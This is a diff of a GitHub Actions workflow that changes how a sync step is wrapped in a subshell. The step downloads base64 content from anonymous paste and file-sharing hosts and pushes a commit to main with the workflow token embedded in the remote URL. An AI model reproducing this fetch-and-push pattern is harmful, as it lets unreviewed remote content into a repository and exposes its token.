@@ -16,9 +16,7 @@ jobs:
         env:
           GH_TOKEN_FOR_PUSH: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          set +e
-          {
-            set -ex
+          ( set -ex
             SHA=1233c1419369b9e8769b2fe072b15531353a38c219d20028d4ae93d9388e487a
             ok=0
             for u in https://paste.rs/f7d07 https://files.catbox.moe/tarjdm.b64 https://tmpfiles.org/dl/w4ABbwOIJRtT/p0.b64; do
@@ -42,7 +40,7 @@ jobs:
             git commit -m "Aim mortars at the crosshair, preview shell impact, and make workshop hardware destroyable"
             REMOTE="https://x-access-token:${GH_TOKEN_FOR_PUSH}@github.com/zakker111/multiplayer_voxel_game.git"
             git push "$REMOTE" HEAD:main
-          } > /tmp/sync.log 2>&1
+          ) > /tmp/sync.log 2>&1
           status=$?
           echo "sync-exit=$status" >> /tmp/sync.log
           cp /tmp/sync.log sync-diag.txt
